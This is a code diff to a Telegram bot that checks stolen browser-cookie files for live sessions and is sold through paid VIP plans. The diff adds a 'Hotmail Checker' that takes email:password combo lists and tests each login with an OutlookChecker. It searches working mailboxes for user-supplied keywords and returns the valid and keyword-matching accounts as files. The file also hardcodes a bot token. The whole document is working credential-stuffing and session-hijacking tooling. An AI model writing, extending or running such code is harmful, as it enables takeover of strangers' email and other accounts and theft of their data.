@@ -13,6 +13,8 @@ import zipfile
 from io import BytesIO
 import sys
 
+from hotmail import OutlookChecker
+
 def _split_cookie_path(file_path):
     p = Path(file_path)
     return p.parent.name, p.name
@@ -690,7 +692,7 @@ SERVICE_TEST_FUNCTIONS = {
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8132478896:AAHY_BiDvT4DB--MI7N2dvhBol2ubdFsh-M"
+BOT_TOKEN = "8132478896:AAEFEsVHPPSbrfPLIqNtFP0CQQjTqg7DSbA"
 ADMIN_USER_ID = "6557052839"
 CHANNEL_CHAT_ID = -1003103353083
 CHANNEL_INVITE_LINK = "https://t.me/+IDNwVF4Ue1AyOTVl"
@@ -872,7 +874,7 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_start_login(update=update)
         return
     keyboard = [
-        [InlineKeyboardButton("Services List", callback_data="services_list"), InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
+        [InlineKeyboardButton("Services List", callback_data="services_list"), InlineKeyboardButton("Scan All Services", callback_data="scan_all"), InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
         [InlineKeyboardButton("Check Plan", callback_data="check_plan"), InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
     ]
     if str(user.id) == ADMIN_USER_ID:
@@ -1028,6 +1030,7 @@ async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("Single Service", callback_data="services_list")],
         [InlineKeyboardButton("Scan All Service", callback_data="scan_all")],
+        [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
         [InlineKeyboardButton("Check Plan", callback_data="check_plan"),InlineKeyboardButton("Buy Plan", callback_data="buy_vip")],
         [InlineKeyboardButton("Back", callback_data="login_menu")]
     ]
@@ -1089,6 +1092,45 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text("Please create an account to use the bot.\nTap Login to continue.", reply_markup=reply_markup)
         return
+    if data == 'hotmail_checker':
+        if is_restricted_private(user_id, chat_id):
+            keyboard = [
+                [InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
+                [InlineKeyboardButton("Back", callback_data="main_menu")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
+            return
+        context.user_data['hotmail_state'] = 'await_keyword'
+        if 'hotmail_keywords' in context.user_data:
+            del context.user_data['hotmail_keywords']
+        keyboard = [
+            [InlineKeyboardButton("Skip keywords", callback_data="hotmail_skip_keyword")],
+            [InlineKeyboardButton("Back", callback_data="main_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "Hotmail Checker\n\nSend keyword file (.txt) or paste keywords (one per line).\n"
+            "If you don't want to use keywords, click Skip keywords.",
+            reply_markup=reply_markup
+        )
+        return
+
+    if data == 'hotmail_skip_keyword':
+        if is_restricted_private(user_id, chat_id):
+            keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],[InlineKeyboardButton("Back", callback_data="main_menu")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(PRIVATE_BLOCK_MESSAGE,reply_markup=reply_markup)
+            return
+        context.user_data['hotmail_state'] = 'await_hotmail'
+        if 'hotmail_keywords' in context.user_data:
+            del context.user_data['hotmail_keywords']
+        keyboard = [
+            [InlineKeyboardButton("Back", callback_data="main_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text("Send hotmail file (txt) or paste hotmail list (email:pass), 1 account per line.",reply_markup=reply_markup)
+        return
     if data.startswith('service_'):
         service_name = data.replace('service_', '')
         if is_restricted_private(user_id, chat_id):
@@ -1122,7 +1164,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(f"BEP20 Address: {wallet_address}")
     elif data == 'main_menu':
         keyboard = [
-            [InlineKeyboardButton("Services List", callback_data="services_list"), InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
+            [InlineKeyboardButton("Services List", callback_data="services_list"), InlineKeyboardButton("Scan All Services", callback_data="scan_all"), InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
             [InlineKeyboardButton("Check Plan", callback_data="check_plan"), InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
         ]
         if str(user_id) == ADMIN_USER_ID:
@@ -1351,6 +1393,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not user or not is_registered(user.id):
         await show_start_login(update=update)
         return
+    if context.user_data.get('hotmail_state'):
+        await handle_hotmail_document(update, context)
+        return
     user_id = user.id
     chat = update.effective_chat
     chat_id = chat.id if chat else None
@@ -1387,15 +1432,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     processed_files = 0
     all_results = {}
     live_cookies = {}
-    
-    try:
-        if ext == '.zip':
-            with zipfile.ZipFile(BytesIO(file_bytes)) as zf:
+
+    def scan_zip_sync(file_bytes_inner, selected_service_inner):
+        processed_files_inner = 0
+        all_results_inner = {}
+        live_cookies_inner = {}
+        try:
+            with zipfile.ZipFile(BytesIO(file_bytes_inner)) as zf:
                 names = [n for n in zf.namelist() if n.lower().endswith('.txt')]
                 if not names:
-                    await status_msg.edit_text("No .txt cookie files found in the .zip")
-                    return
-                
+                    return 0, "No .txt cookie files found in the .zip", {}
                 files_to_process = []
                 for n in names:
                     try:
@@ -1408,44 +1454,39 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         files_to_process.append((Path(n).name, content))
                     except Exception as e:
                         logger.error(f"Error reading file {n}: {e}")
-                
                 with ThreadPoolExecutor(max_workers=10) as executor:
                     futures = []
-                    for file_name, content in files_to_process:
-                        future = executor.submit(process_single_file, file_name, content, selected_service)
+                    for file_name_inner, content_inner in files_to_process:
+                        future = executor.submit(process_single_file, file_name_inner, content_inner, selected_service_inner)
                         futures.append(future)
-                    
                     for future in as_completed(futures):
-                        file_name, result = future.result()
-                        processed_files += 1
-                        
-                        if 'error' in result:
-                            if 'error_messages' not in all_results:
-                                all_results['error_messages'] = []
-                            all_results['error_messages'].append(f"{file_name}: {result['error']}")
+                        file_name_inner, result_inner = future.result()
+                        processed_files_inner += 1
+                        if 'error' in result_inner:
+                            if 'error_messages' not in all_results_inner:
+                                all_results_inner['error_messages'] = []
+                            all_results_inner['error_messages'].append(f"{file_name_inner}: {result_inner['error']}")
                         else:
-                            if selected_service == 'all':
-                                all_results[file_name] = result
-                                for svc, r in result.get('all_results', {}).items():
+                            if selected_service_inner == 'all':
+                                all_results_inner[file_name_inner] = result_inner
+                                for svc, r in result_inner.get('all_results', {}).items():
                                     if r.get('status') == 'success':
-                                        if svc not in live_cookies:
-                                            live_cookies[svc] = []
-                                        live_cookies[svc].append((file_name, r))
+                                        if svc not in live_cookies_inner:
+                                            live_cookies_inner[svc] = []
+                                        live_cookies_inner[svc].append((file_name_inner, r))
                             else:
-                                all_results[file_name] = result
-                                if result.get('status') == 'success':
-                                    if selected_service not in live_cookies:
-                                        live_cookies[selected_service] = []
-                                    live_cookies[selected_service].append((file_name, result))
-                
-                summary_lines = []
-                summary_lines.append(f"Scan Summary for {len(names)} files:")
-                
-                if selected_service == 'all':
+                                all_results_inner[file_name_inner] = result_inner
+                                if result_inner.get('status') == 'success':
+                                    if selected_service_inner not in live_cookies_inner:
+                                        live_cookies_inner[selected_service_inner] = []
+                                    live_cookies_inner[selected_service_inner].append((file_name_inner, result_inner))
+                summary_lines_inner = []
+                summary_lines_inner.append(f"Scan Summary for {len(names)} files:")
+                if selected_service_inner == 'all':
                     service_stats = {}
-                    for file_name, result in all_results.items():
-                        if 'all_results' in result:
-                            for svc, r in result['all_results'].items():
+                    for file_name_inner, result_inner in all_results_inner.items():
+                        if 'all_results' in result_inner:
+                            for svc, r in result_inner['all_results'].items():
                                 if svc not in service_stats:
                                     service_stats[svc] = {'live': 0, 'dead': 0, 'unknown': 0, 'no_cookies': 0, 'error': 0}
                                 status = r.get('status', 'unknown')
@@ -1459,7 +1500,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     service_stats[svc]['error'] += 1
                                 else:
                                     service_stats[svc]['unknown'] += 1
-                    
                     for svc_key, stats in service_stats.items():
                         if stats['live'] > 0 or stats['dead'] > 0:
                             service_name_display = SERVICES.get(svc_key, svc_key).title()
@@ -1470,12 +1510,12 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 line += f", {stats['no_cookies']} no cookies"
                             if stats['error'] > 0:
                                 line += f", {stats['error']} error"
-                            summary_lines.append(line)
+                            summary_lines_inner.append(line)
                 else:
                     stats = {'live': 0, 'dead': 0, 'unknown': 0, 'no_cookies': 0, 'error': 0}
-                    for file_name, result in all_results.items():
-                        if 'error' not in result:
-                            status = result.get('status', 'unknown')
+                    for file_name_inner, result_inner in all_results_inner.items():
+                        if 'error' not in result_inner:
+                            status = result_inner.get('status', 'unknown')
                             if status == 'success':
                                 stats['live'] += 1
                             elif status == 'dead':
@@ -1486,37 +1526,42 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 stats['error'] += 1
                             else:
                                 stats['unknown'] += 1
-                    
-                    service_name_display = SERVICES.get(selected_service, selected_service).title()
-                    summary_lines.append(f"{service_name_display} Scan Summary:")
-                    summary_lines.append(f"✅ Live: {stats['live']}, ❌ Dead: {stats['dead']}")
+                    service_name_display = SERVICES.get(selected_service_inner, selected_service_inner).title()
+                    summary_lines_inner.append(f"{service_name_display} Scan Summary:")
+                    summary_lines_inner.append(f"✅ Live: {stats['live']}, ❌ Dead: {stats['dead']}")
                     if stats['unknown'] > 0:
-                        summary_lines.append(f"Unknown: {stats['unknown']}")
+                        summary_lines_inner.append(f"Unknown: {stats['unknown']}")
                     if stats['no_cookies'] > 0:
-                        summary_lines.append(f"No Cookies: {stats['no_cookies']}")
+                        summary_lines_inner.append(f"No Cookies: {stats['no_cookies']}")
                     if stats['error'] > 0:
-                        summary_lines.append(f"Errors: {stats['error']}")
-                
-                if 'error_messages' in all_results and all_results['error_messages']:
-                    summary_lines.append("")
-                    summary_lines.append("Errors:")
-                    for err in all_results['error_messages'][:5]:
-                        summary_lines.append(f"• {err}")
-                    if len(all_results['error_messages']) > 5:
-                        summary_lines.append(f"• ...and {len(all_results['error_messages']) - 5} more errors")
-                
-                await status_msg.edit_text("\n".join(summary_lines))
-                
-                if live_cookies:
-                    await send_live_cookies_archive(update, live_cookies, selected_service)
-                
+                        summary_lines_inner.append(f"Errors: {stats['error']}")
+                if 'error_messages' in all_results_inner and all_results_inner['error_messages']:
+                    summary_lines_inner.append("")
+                    summary_lines_inner.append("Errors:")
+                    for err in all_results_inner['error_messages'][:5]:
+                        summary_lines_inner.append(f"• {err}")
+                    if len(all_results_inner['error_messages']) > 5:
+                        summary_lines_inner.append(f"• ...and {len(all_results_inner['error_messages']) - 5} more errors")
+                summary_text_inner = "\n".join(summary_lines_inner)
+                return processed_files_inner, summary_text_inner, live_cookies_inner
+        except Exception as e:
+            logger.error(f"Error processing document: {e}")
+            return processed_files_inner, f"Error processing file: {str(e)}", {}
+    
+    try:
+        if ext == '.zip':
+            processed_files_zip, summary_text, live_cookies = await asyncio.to_thread(scan_zip_sync, file_bytes, selected_service)
+            processed_files += processed_files_zip
+            await status_msg.edit_text(summary_text)
+            if live_cookies:
+                await send_live_cookies_archive(update, live_cookies, selected_service)
         elif ext == '.txt':
             try:
                 content = file_bytes.decode('utf-8')
             except UnicodeDecodeError:
                 content = file_bytes.decode('latin-1', errors='ignore')
             
-            file_name, result = process_single_file(file_name, content, selected_service)
+            file_name, result = await asyncio.to_thread(process_single_file, file_name, content, selected_service)
             processed_files += 1
             
             if 'error' in result:
@@ -1602,6 +1647,176 @@ async def send_live_cookies_archive(update: Update, live_cookies, selected_servi
         logger.error(f"Error creating archive: {e}")
         await update.message.reply_text(f"Error creating archive: {str(e)}")
 
+async def handle_hotmail_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if not user:
+        return
+    state = context.user_data.get('hotmail_state')
+    if not state:
+        return
+    doc = update.message.document
+    if not doc:
+        return
+    file = await doc.get_file()
+    file_bytes = await file.download_as_bytearray()
+    try:
+        content = file_bytes.decode('utf-8')
+    except UnicodeDecodeError:
+        content = file_bytes.decode('latin-1', errors='ignore')
+    if state == 'await_keyword':
+        keywords = []
+        for line in content.splitlines():
+            k = line.strip()
+            if k:
+                keywords.append(k)
+        context.user_data['hotmail_keywords'] = keywords
+        context.user_data['hotmail_state'] = 'await_hotmail'
+        await update.message.reply_text(
+            "Received keyword from file.\nNow send hotmail file (txt) or paste hotmail list (email:pass), 1 account per line."
+        )
+    elif state == 'await_hotmail':
+        if 'hotmail_state' in context.user_data:
+            del context.user_data['hotmail_state']
+        await run_hotmail_scan(update, context, content)
+
+async def handle_hotmail_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if not user or not is_registered(user.id):
+        return
+    state = context.user_data.get('hotmail_state')
+    if not state:
+        return
+    text = update.message.text or ""
+    if not text.strip():
+        return
+    if state == 'await_keyword':
+        keywords = []
+        for line in text.splitlines():
+            k = line.strip()
+            if k:
+                keywords.append(k)
+        context.user_data['hotmail_keywords'] = keywords
+        context.user_data['hotmail_state'] = 'await_hotmail'
+        await update.message.reply_text(
+            "Received keyword.\nNow send hotmail file (txt) or paste hotmail list (email:pass), 1 account per line."
+        )
+    elif state == 'await_hotmail':
+        if 'hotmail_state' in context.user_data:
+            del context.user_data['hotmail_state']
+        await run_hotmail_scan(update, context, text)
+
+def run_hotmail_scan_sync(combos_text: str, keywords):
+    import time
+    checker = OutlookChecker(keyword_file=None, debug=False)
+    if keywords:
+        extra = []
+        for k in keywords:
+            if k and k not in checker.keywords:
+                extra.append(k)
+        checker.keywords.extend(extra)
+    valid_no_keyword = []
+    valid_with_keyword = []
+    lines = combos_text.splitlines()
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+        sep = None
+        if ':' in line:
+            sep = ':'
+        elif '|' in line:
+            sep = '|'
+        if not sep:
+            continue
+        parts = line.split(sep, 1)
+        if len(parts) != 2:
+            continue
+        email = parts[0].strip()
+        password = parts[1].strip()
+        if not email or not password:
+            continue
+        if email in checker.checked_emails:
+            continue
+        checker.checked_emails.add(email)
+        result = checker.check(email, password)
+        full = f"{email}:{password} | {result}"
+        if "✅ HIT" in result:
+            valid_with_keyword.append(full)
+        elif "🆓 FREE" in result:
+            valid_no_keyword.append(full)
+        time.sleep(2)
+    return valid_no_keyword, valid_with_keyword
+
+async def run_hotmail_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, combos_text: str):
+    user = update.effective_user
+    if not user:
+        return
+    user_id = user.id
+    can_scan, error_msg = can_user_scan(user_id)
+    if not can_scan:
+        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(error_msg, reply_markup=reply_markup)
+        return
+
+    status_msg = await update.message.reply_text("Checking hotmail, please wait...")
+
+    keywords = context.user_data.get('hotmail_keywords')
+    had_keywords = 'hotmail_keywords' in context.user_data
+
+    valid_no_keyword, valid_with_keyword = await asyncio.to_thread(
+        run_hotmail_scan_sync, combos_text, keywords
+    )
+
+    increment_file_count(user_id)
+    increment_daily_scans(1)
+
+    if 'hotmail_state' in context.user_data:
+        del context.user_data['hotmail_state']
+    if 'hotmail_keywords' in context.user_data:
+        del context.user_data['hotmail_keywords']
+
+    try:
+        await status_msg.edit_text("Hotmail check completed.")
+    except Exception:
+        pass
+
+    if not valid_no_keyword and not valid_with_keyword:
+        await update.message.reply_text("No live hotmail accounts found. ❓")
+        return
+
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    if had_keywords:
+        buf1 = BytesIO("\n".join(valid_no_keyword).encode('utf-8', errors='ignore'))
+        buf1.name = f"hotmail_valid_{ts}.txt"
+        await update.message.reply_document(
+            document=buf1,
+            caption=f"✅Hotmail Valid (no keyword found). Total: {len(valid_no_keyword)}"
+        )
+
+        buf2 = BytesIO("\n".join(valid_with_keyword).encode('utf-8', errors='ignore'))
+        buf2.name = f"hotmail_found_{ts}.txt"
+        await update.message.reply_document(
+            document=buf2,
+            caption=f"✅Hotmail Found (keyword found). Total: {len(valid_with_keyword)}"
+        )
+    else:
+        if valid_no_keyword:
+            buf1 = BytesIO("\n".join(valid_no_keyword).encode('utf-8', errors='ignore'))
+            buf1.name = f"hotmail_valid_{ts}.txt"
+            await update.message.reply_document(
+                document=buf1,
+                caption=f"✅Hotmail Valid (no keyword found). Total: {len(valid_no_keyword)}"
+            )
+        if valid_with_keyword:
+            buf2 = BytesIO("\n".join(valid_with_keyword).encode('utf-8', errors='ignore'))
+            buf2.name = f"hotmail_found_{ts}.txt"
+            await update.message.reply_document(
+                document=buf2,
+                caption=f"✅Hotmail Found (keyword found). Total: {len(valid_with_keyword)}"
+            )
+
 async def show_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await show_start_login(update=update)
 
@@ -1610,7 +1825,7 @@ def main():
     _fast_print("Make sure to install required packages:")
     _fast_print("pip install curl-cffi python-telegram-bot requests")
     
-    application = Application.builder().token(BOT_TOKEN).build()
+    application = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("menu", menu))
     application.add_handler(CommandHandler("checkplan", check_plan))
@@ -1619,6 +1834,7 @@ def main():
     application.add_handler(CommandHandler("delvip", admin_del_vip))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_hotmail_text))
     application.run_polling()
 
 if __name__ == "__main__":
